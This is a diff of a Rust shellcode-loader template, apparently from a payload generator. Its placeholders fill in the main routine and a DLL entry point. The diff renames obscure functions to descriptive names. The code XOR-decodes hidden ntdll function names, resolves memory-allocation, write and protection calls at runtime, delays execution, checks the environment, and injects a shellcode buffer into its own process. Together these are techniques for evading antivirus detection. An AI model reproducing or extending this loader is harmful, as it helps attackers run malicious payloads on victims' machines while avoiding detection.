@@ -38,14 +38,14 @@ const OBF_C: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
 const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
 const OBF_H: &[u8] = &{{OBF_NT_DELAY_EXECUTION}};
 
-fn r(d: &[u8]) -> Vec<u8> {
+fn deobfuscate_bytes(d: &[u8]) -> Vec<u8> {
     d.iter().map(|b| b ^ K).collect()
 }
 
-unsafe fn g(n: &[u8]) -> *const () {
+unsafe fn resolve_nt_api_address(n: &[u8]) -> *const () {
     let ntdll = CString::new(lc!("ntdll")).unwrap();
     let h = GetModuleHandleA(ntdll.as_ptr());
-    let s = r(n);
+    let s = deobfuscate_bytes(n);
     let c = CString::new(s).unwrap();
     GetProcAddress(h, c.as_ptr()) as *const ()
 }
@@ -57,7 +57,7 @@ type FH = unsafe extern "system" fn(u32, *const i64) -> i32;
 
 fn pause(ms: i64) {
     unsafe {
-        let f: FH = std::mem::transmute(g(OBF_H));
+        let f: FH = std::mem::transmute(resolve_nt_api_address(OBF_H));
         let interval: i64 = -(ms * 10_000);
         f(0, &interval);
     }
@@ -70,13 +70,13 @@ fn check_environment() -> bool {
 }
 
 
-fn enhance(mut buf: Vec<u8>) {
+fn inject_shellcode(mut buf: Vec<u8>) {
     let current_process: HANDLE = -1isize as HANDLE;
 
     unsafe {
-        let f_alloc: FB = std::mem::transmute(g(OBF_B));
-        let f_write: FC = std::mem::transmute(g(OBF_C));
-        let f_protect: FD = std::mem::transmute(g(OBF_D));
+        let f_alloc: FB = std::mem::transmute(resolve_nt_api_address(OBF_B));
+        let f_write: FC = std::mem::transmute(resolve_nt_api_address(OBF_C));
+        let f_protect: FD = std::mem::transmute(resolve_nt_api_address(OBF_D));
 
         let mut base: *mut c_void = null_mut();
         let mut size: usize = buf.len();
@@ -121,7 +121,7 @@ fn main() {
 
     {{MAIN}}
 
-    enhance(vec);
+    inject_shellcode(vec);
 }
 
 {{DLL_MAIN}}
